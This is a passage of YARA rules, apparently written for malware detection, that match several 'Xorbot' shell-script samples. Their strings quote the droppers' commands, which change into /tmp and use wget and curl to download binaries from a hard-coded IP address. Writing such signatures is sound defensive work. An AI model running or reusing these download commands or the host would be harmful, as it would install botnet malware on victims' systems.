      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/mnSHzMAzpP86o8wjWANuHmVdipKh0qo6Mf; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/eqZemRnSHbCZ3cQCveiGthr698qb8RAZWt; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/xmbCOtxR39YLjxqeH7F7E974dIXwTgM3yi; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/7xuxSqk6K16bCuILDSobDevQRw5ouP6dxl; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Eb7YboBCMu65Pl8qpaI6FkhDotQdOdSavI; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/zUdwIxyOVUTQuCWkPybDXEuN0mKygqsX8t; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/cXo0G7dgF5N2pXi5CTJv1GBSqqzUzx7FfD; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/QurswvUzJNygCZ1aNIhPdBtUBFFe9xWIom; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/JC05S8fVOMzBAoaU8u3vUH8rMYVR7hjEVR; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/YOQooaJZa2JjLmYwmw6rPjlqc45NwbMBoN; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/mYkWKPTcE3icweBzjsQfkp9alHfrX1fdqt; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/tmW9FKPbvkmIX0CeExGAB4RfuQBueI2RSe; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/WiRfx4TISq3i7RAbXwOGcEEN1lqaPNIECk; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/8Qah7fVrR1vptqW7rXmPn85KdCkVTTZW8R; curl -" ascii /* score: '30.00'*/
      $s15 = "wget http://178.16.54.252/bins/eqZemRnSHbCZ3cQCveiGthr698qb8RAZWt; curl -O  http://178.16.54.252/bins/eqZemRnSHbCZ3cQCveiGthr698" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__5f07134f {
   meta:
      description = "_subset_batch - file Xorbot(signature)_5f07134f.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5f07134ff0f1c5048f41bc8583e74f95cd7ab9bc1e6f4957a45ac6042066e48b"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/VStuQmDJWkYwWD1VoeIPfnlDd9dwtiYM4T; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/v2GEW8DoGs2drLjTcScE5GQ6z6S5rPhAcH; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/oe0FzMy1UvZm8i7gf2joWIb8CE2rEt7qu3; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/aTpSI4nIVnQ00828fFcbCLGx3GAN8uP1CZ; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/4cC1A7K9LmrWneSj0q2K9NM3zwu4lKmt5z; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Qj4ruNv7e6AifVSIFYrbDe61FTwUos8uzY; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/bGqBSVO2XfQDhCB1l36jS3kzV2h2IsxsZK; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/l6ghXWGk79DJKh5jWaYz0TkPJ3sB5RQUJG; curl -" ascii /* score: '30.00'*/
      $s9 = "wget http://178.16.54.252/bins/Qj4ruNv7e6AifVSIFYrbDe61FTwUos8uzY; curl -O  http://178.16.54.252/bins/Qj4ruNv7e6AifVSIFYrbDe61FT" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/krsj923fnVrkCy2507MIcYb01IGh1eLXCL; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Pz0n4cr8efpZKeLIYqy23Hwo8VqgVpKW8u; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/UX7Etpt2wqNGYF9hOUINut9owWNmAy6vy4; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/b4rnNQoTak7WY1qtpjQrDUoLIoio9Nnsbj; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/70KuyVbMHGljTiufJAg4bjFfLgM1pgjXCw; curl -" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/oe0FzMy1UvZm8i7gf2joWIb8CE2rEt7qu3; curl -" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__751d5b12 {
   meta:
      description = "_subset_batch - file Xorbot(signature)_751d5b12.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "751d5b128653b4b72069e2907b77c7f0fa6b31bc468e039fb5a625feb5a96707"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/JXshK1owBJSH1GHsM0g7yJh76hWFZREbv8; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/5kUNi3h0HV5Km32T9beab6Duo796mnMjsf; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/wzyx1japuvBmxC7hrupiDVFEScuDYR9XIJ; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/CcUkmvBVlWmxDqDGOLlpjcpKEHu2pBnWqV; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/YXGJX8EXHpY4OROQrTO11N2xqzHCYO5XUo; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/UzeGrhbqwsr6ovmlTy8Zn4E7uyyyIRxdRL; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/xgUUIiWEbW90S8kkwEgFNELkafIkPyGzzf; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/P8zWVNb2AjBmfrVNoWjbBiSGjb9aO67cid; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/luPtVykE7AwqxLHhFWYXFeAGqWxQPyy33H; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/JAQl1fdxV0rDh95ZJLD8g25dmGLNO9tUTl; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/9JWbj8EHKfg9IY80VhTnG6yR0Y8VqQ9AAl; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/8dadzcspwv6UjkRPExDgMRzx6TvN49LUNp; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/vLHUZXBACqzuVvwv6c6Xa5Nm1tVTqqnMTt; curl -" ascii /* score: '30.00'*/
      $s14 = "wget http://178.16.54.252/bins/JAQl1fdxV0rDh95ZJLD8g25dmGLNO9tUTl; curl -O  http://178.16.54.252/bins/JAQl1fdxV0rDh95ZJLD8g25dmG" ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/UzeGrhbqwsr6ovmlTy8Zn4E7uyyyIRxdRL; curl -" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__77f5db88 {
   meta:
      description = "_subset_batch - file Xorbot(signature)_77f5db88.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "77f5db885636a503f9992546eb7db6a31e001bf84bb1357a256e201c3c8dcd30"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/esRHdztkXZg0B9buY7byCs8FwYHLdt4Mra; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/zMqUfq2Y4S1ogQiFF9dSJ76AZpEU3fcn7B; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/hl71PsSlLzHxL6zjxFEYJVfZzQ6gEn7jUz; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/hGuPuu3LxFZMNaQOEzFaJdkby2fQ8syqQj; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/HnpVUOFKwVvmgRUyHSMEIIBvnq5I4pdEOz; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/S63IzB6fjmebuwlyFeEWAO0ww0XPme1I4x; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/iwdRSpiVunOBMGDVd5YtLjEEZamaX3GgZb; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/zPbAp3i5CVaFDZYhSSBq8GO5jhSBezpVfS; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Jo9YCZihBPFqdK91A4VaOMQr8Esu1AmBer; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/nBI3iNH1YxfMdVSK0K5gFF2YahhAZ1cMSR; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/tJCQNpqhqP1tINDo4qvSgNJWvvnUtBcKCX; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Ngkqfbyfqog8DBM6rPSXFx5a0EiesrV3e0; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/oRzpBjcz7icIRNjEOUfsyZqy0VG3nvBps1; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/hl71PsSlLzHxL6zjxFEYJVfZzQ6gEn7jUz; curl -" ascii /* score: '27.00'*/
      $s15 = "wget http://178.16.54.252/bins/tJCQNpqhqP1tINDo4qvSgNJWvvnUtBcKCX; curl -O  http://178.16.54.252/bins/tJCQNpqhqP1tINDo4qvSgNJWvv" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__7d51d497 {
   meta:
      description = "_subset_batch - file Xorbot(signature)_7d51d497.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7d51d497ef5befe51278089e5df51464fa6a2438ddfa9877a4e9c98f6dcd8825"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/VmRYzXLXPRJ7qADnUMZpRAi3qUackXR31U; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/nGesea7dAIZ6c6jgbOOEFalw7s9bivzvjB; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/mmGaB2pOcLliNwIDAnNkH519oXvfg1YCcB; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/uDNVX1yUW9RNbOgFbyyqlFrHqjNxBfLguO; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/GayeLcVjeABSXqsXYSQwif8zHieva49SLc; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/k6AcWgLww9ebXxIdE7X6iPOndThWSvTryb; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/QRgSqtoeKrMS3qi1DgB6Zui3oWVnZoJIOD; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/RuotPTBXFUs59oEl9OUAySnpnbjxCfJoGp; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/SJ5W0zB7Wx3Im6HhNjMbk9rviozyfBKUs4; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/liVrJLAFBtesxZJmB1M7EaMX7vf5a09tJ4; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/jSigX3fcPr59cI3IA4KqW263FufetEHXAU; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/b2jYeHaditylJ7X182Fu7a9ZyBh53IipaO; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/6vhfWA0YHvobprLkACgby6v5QraIHyLxYR; curl -" ascii /* score: '30.00'*/
      $s14 = "wget http://178.16.54.252/bins/VmRYzXLXPRJ7qADnUMZpRAi3qUackXR31U; curl -O  http://178.16.54.252/bins/VmRYzXLXPRJ7qADnUMZpRAi3qU" ascii /* score: '27.00'*/
      $s15 = "wget http://178.16.54.252/bins/SJ5W0zB7Wx3Im6HhNjMbk9rviozyfBKUs4; curl -O  http://178.16.54.252/bins/SJ5W0zB7Wx3Im6HhNjMbk9rvio" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__81737ca9 {
   meta:
      description = "_subset_batch - file Xorbot(signature)_81737ca9.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "81737ca91d40dc9fbe0da4f45ddad46cf2f4822cb238484aa3f9832259cd8b43"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Rb8t0Ym6PS5bDaqgVPwNK1xZ8a2TldKSwn; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/TrqGj1OwrIRdoLfbeFm92h54Txi1JRM5iX; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/RplDRPKV1F9Dw838tuK6r1iBkimPmQIKC4; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/fa4WZFXM64dd2khAxJlRnr1CmzXsn9x33b; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/lcBl5OCkQMrylig5PJ4dal5aif6M66cSEB; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/u9HNqZjvTZSIBeM93eeZTWCKLzaWVNaet2; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/8ujyowVemQsIeVCnAnYTWY2WTNWVPHi4FW; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/ggAIRiDu5iyFpN83RqHfVbdz7GcqwU7Uh2; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/II5RTlppdLwpq5w2kqL2FRm5NCTLOYqQgB; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/nAYgEBPtpeez8WKx8F37REsIj62cGhwGkM; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/A8g33nPFp1Ikovpg8YQ7ohy1I3JJ9epAIy; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Sri6R87WK9o853teIrKsxgQV3kcUNfxNFa; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/B7UNOynaQsvPvtnivhrQMn3yvQtHX1R1wj; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/TUZ1JhXfB7SELFZE0uI4wqny8NLNbknV3X; curl -" ascii /* score: '30.00'*/
      $s15 = "wget http://178.16.54.252/bins/fa4WZFXM64dd2khAxJlRnr1CmzXsn9x33b; curl -O  http://178.16.54.252/bins/fa4WZFXM64dd2khAxJlRnr1Cmz" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__835b6800 {
   meta:
      description = "_subset_batch - file Xorbot(signature)_835b6800.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "835b68005f0badff2b83fa0ad3050f1e1738218ba714875e09bc69cf2ced4995"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/8DOEMhUnQw8eLegoFvxOExEFifZU0TDWOB; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/1NK1BAn0zwtQZdSRT738SRznvG8sQhxhKY; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/kNA1OKbI2rxlqQ53EEAmQAr8Zxedu5XUKF; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/MLT6aR93U4s53N3tWALL7rG6l2vI7qiIjb; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/obtmzuUseNVHj7km97eUFCx92cX5BJegce; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/KKpJsfVCxHa5V0uCv85ItLkZg039KzH6pq; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/6Gxh3hjNsrEjCiM1SqysfC4iUUejWL08CD; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/ialVKFfhJ1VGJOQ2iy1asBXKsowSmVTvJL; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/SoR1vcLWsbR9fINdso7qFHTfCQJs06P9jQ; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/uUZn6d0hlguZuSXLmEDyWHXCLhyp7AIhqb; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/JfPmpMZGXzzQs0xe5BUP1a2bDyju5gDtJR; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/dsxDKHYf8VHUuTNun56js7OkKUzcT3chSm; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/QlfetoXbD7IfOvC3DA332Mlnj1vpO3JHPb; curl -" ascii /* score: '30.00'*/
      $s14 = "wget http://178.16.54.252/bins/dsxDKHYf8VHUuTNun56js7OkKUzcT3chSm; curl -O  http://178.16.54.252/bins/dsxDKHYf8VHUuTNun56js7OkKU" ascii /* score: '27.00'*/
      $s15 = "wget http://178.16.54.252/bins/obtmzuUseNVHj7km97eUFCx92cX5BJegce; curl -O  http://178.16.54.252/bins/obtmzuUseNVHj7km97eUFCx92c" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__850bf454 {
   meta:
      description = "_subset_batch - file Xorbot(signature)_850bf454.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "850bf4549a900d97ed3b95f1f3ee3196fbc4e30ea2a1db381538ae4c53eab51d"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/e3fN9UCjP8w9SRIrP4ms18Ir6cc8H1fupY; curl -" ascii /* score: '34.00'*/
      $x2 = "wget http://178.16.54.252/bins/e3fN9UCjP8w9SRIrP4ms18Ir6cc8H1fupY; curl -O  http://178.16.54.252/bins/e3fN9UCjP8w9SRIrP4ms18Ir6c" ascii /* score: '31.00'*/
      $x3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/e3fN9UCjP8w9SRIrP4ms18Ir6cc8H1fupY; curl -" ascii /* score: '31.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/lfK5HQAm9J33aHVq59EloETy0ceJXKPpmf; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/SoBnDgEm8D4qbIryJIWmeIpvKHBAJFrJPn; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/3EYGpfBlrr87IK2Ndw5G2QMI9vizXHqxYZ; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/bAoRm9wMk9Yh6zmlN4VQwK4PXMrOaRTKPQ; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/g2DvWbx53POm991vwmYLpr0QKEAfcGpdoF; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/zqBW7eHsWwJANkm5JU3g1bnLTGOZY6r5iM; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/n92vmzVThvC5jMNcDFmsBWqAMHqbCyPgyS; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/9fCmgJQy4YqXlKeW0vtpSIsSlFS4Y6sHuS; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/0YZFcW8IAiHYdT0CN2iY3TEyKq3wH82kcc; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/bHvTQFCvBVPcRp8vFIA44pelyz0IBhDRiY; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Dr1B6I541RZ3mWENbU7TX8gWUieixmTKQ6; curl -" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/khuWhovGQRk2ea77pKREIze1Vxp3msApTo; curl -" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule Xorbot_signature__8d45e6c3 {
   meta:
      description = "_subset_batch - file Xorbot(signature)_8d45e6c3.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8d45e6c3500ca1aa093cc565efd71f7b9a288561ec4844c93e0cb212a325d104"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/kEidOwJFGFKsrtENphBSLVlD00yS1AbwBv; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/5S7izUbTYkigJ9lr2DeXIvB9TtZIoDMkOv; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/iEnsNzMuvwPc0H1Vpfu9WsD1TUjEauSQst; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/9Jy01XtfNYQ1akhb6mUBYAVxGFJA6wNvbH; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/pbpPgRUZgFUwC3U66cKpO72ozijPdPXFyW; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/DdKiFE5fJNTIaonTJnhgM2Ks3pLAzz8biQ; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/4xoMANzVfHqysFPTckWH5MNgG6Ly8mTwHv; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/N00J0VdCy3CEfIEYyh25zmbIemCuRtivIH; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/H25o86AuU9wYCNdN4wYkJUFb3gpY4GoiQs; curl -" ascii /* score: '30.00'*/
